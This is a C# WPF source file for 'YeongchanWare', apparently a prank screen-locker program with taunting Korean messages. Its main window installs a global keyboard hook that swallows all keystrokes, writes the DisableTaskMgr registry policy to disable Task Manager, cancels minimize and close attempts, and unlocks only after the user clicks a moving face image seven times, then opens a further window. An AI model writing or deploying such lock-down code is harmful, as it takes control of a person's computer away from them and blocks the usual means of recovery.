using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Interop;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using Microsoft.Win32;
using Hook;

namespace YeongchanWare
{
    /// <summary>
    /// MainWindow.xaml에 대한 상호 작용 논리
    /// </summary>
    public partial class MainWindow : Window
    {
        bool readyForClose = false;
        int time = 0;
        internal static KeyboardHook hook;
        internal static Back back;
        public MainWindow()
        {
            InitializeComponent();
            this.SourceInitialized += MainWindow_SourceInitialized;
            r = new Random();

            back = new Back();
            back.Show();

            hook = new KeyboardHook(true);
            hook.KeyEvented += (k, t) => false;
            hook.HookStart();
            TaskManager(false);
        }

        public static void TaskManager(bool enabled)
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (enabled && objRegistryKey.GetValue("DisableTaskMgr") != null)
                objRegistryKey.DeleteValue("DisableTaskMgr");
            else
                objRegistryKey.SetValue("DisableTaskMgr", "1");
            objRegistryKey.Close();
        }

        private void MainWindow_SourceInitialized(object sender, EventArgs e)
        {
            HwndSource source = (HwndSource)PresentationSource.FromVisual(this);
            source.AddHook(new HwndSourceHook(HandleMessages));
        }

        private IntPtr HandleMessages(IntPtr hwnd, int msg, IntPtr wParam, IntPtr lParam, ref bool handled)
        {
            if (msg == 0x0112 && ((int)wParam & 0xFFF0) == 0xF020)
            {
                // Cancel the minimize.
                handled = true;
            }

            return IntPtr.Zero;
        }

        Random r;
        private void SetImageRandomPosition()
        {
            Canvas.SetLeft(face, r.Next((int)(Width - face.Width)) - face.Width / 2);
            Canvas.SetTop(face, r.Next((int)(Height - face.Height)) - face.Height / 2);
        }

        private void SetRandomAnimation()
        {
            face.BeginAnimation(Canvas.LeftProperty, null);
            face.BeginAnimation(Canvas.TopProperty, null);

            double newLeft = r.Next(Convert.ToInt32(Width - face.Width));
            double newTop = r.Next(Convert.ToInt32(Height - face.Height));

            DoubleAnimation animLeft = new DoubleAnimation(Canvas.GetLeft(face), newLeft, new Duration(TimeSpan.FromSeconds(0.3)));
            Canvas.SetLeft(face, newLeft);
            DoubleAnimation animTop = new DoubleAnimation(Canvas.GetTop(face), newTop, new Duration(TimeSpan.FromSeconds(0.3)));
            Canvas.SetTop(face, newLeft);

            animLeft.EasingFunction = new CubicEase() { EasingMode = EasingMode.EaseOut };
            animTop.EasingFunction = new CubicEase() { EasingMode = EasingMode.EaseOut };

            face.BeginAnimation(Canvas.LeftProperty, animLeft);
            face.BeginAnimation(Canvas.TopProperty, animTop);
        }

        private void Why_Button_Click(object sender, RoutedEventArgs e)
        {
            Info info = new Info();
            info.ShowDialog();
        }

        private void Hidden_Button_Click(object sender, RoutedEventArgs e)
        {
            MessageBox.Show("이걸 찾은 당신은 대단한 잉여력은 가지고 있습니다! 하지만 이 버튼을 누른다고 아무 일도 일어나지 않습니다.");
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            e.Cancel = !readyForClose;
        }

        private void face_MouseRightButtonUp(object sender, MouseButtonEventArgs e)
        {
            time++;
            SetRandomAnimation();
            if (time < 5)
                timeCnt.Text = $"이제 겨우 {time}번 눌렀구나 {3 - time}번 남았거늘 ㅉㅉ";
            else if (time < 7)
                timeCnt.Text = $"{time}번 눌렀는데 왜 안 꺼지냐고??? 내 알 바 아님 버그겠지";
            else
            {
                readyForClose = true;
                MessageBox.Show("수고했음 ㅋ");
                this.Close();
            }
        }

        private void Window_Closed(object sender, EventArgs e)
        {
            new Question().Show();
        }
    }
}
